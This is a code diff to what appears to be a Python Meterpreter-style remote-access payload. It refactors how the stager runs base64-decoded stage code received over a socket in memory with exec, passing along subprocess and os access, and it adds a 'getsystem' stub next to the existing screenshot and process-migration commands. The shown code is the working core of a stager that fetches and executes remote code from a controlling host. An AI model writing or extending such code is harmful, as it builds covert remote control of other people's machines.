@@ -64,9 +64,24 @@ def connect_and_load():
         # Decode and execute stage code in memory
         stage_code = base64.b64decode(stage_data).decode('utf-8')
         
-        # Execute the stage code (Meterpreter client)
-        # Pass the socket to the stage so it can continue using it
-        exec(compile(stage_code, '<stage>', 'exec'), {{'sock': sock, 'socket': socket, 'struct': struct, 'json': __import__('json'), 'subprocess': __import__('subprocess'), 'os': __import__('os'), 'sys': __import__('sys'), 'base64': base64, 'platform': __import__('platform'), 'time': __import__('time'), 'shlex': __import__('shlex')}})
+        # Execute the stage code (Meterpreter client).
+        # Pass the socket to the stage so it can continue using it.
+        exec_globals = {{
+            'sock': sock,
+            'socket': socket,
+            'struct': struct,
+            'json': __import__('json'),
+            'subprocess': __import__('subprocess'),
+            'os': __import__('os'),
+            'sys': __import__('sys'),
+            'base64': base64,
+            'platform': __import__('platform'),
+            'time': __import__('time'),
+            'shlex': __import__('shlex'),
+            '__name__': '__main__',
+            '__file__': '<stage>',
+        }}
+        exec(compile(stage_code, '<meterpreter_stage>', 'exec'), exec_globals, exec_globals)
         
     except Exception as e:
         import sys
@@ -673,6 +688,9 @@ class MeterpreterClient:
                             return "", 1, f"Linux screenshot error: {str(e)}"
                 except Exception as e:
                     return "", 1, f"screenshot error: {str(e)}"
+
+            elif cmd == 'getsystem':
+                return "", 1, "getsystem is not supported by the Python Meterpreter payload on this platform"
             
             elif cmd == 'migrate':
                 # Migrate to another process
@@ -885,4 +903,3 @@ if __name__ == '__main__':
         # Fallback: generate it if not already generated
         self.generate()
         return self.meterpreter_stage_code
-
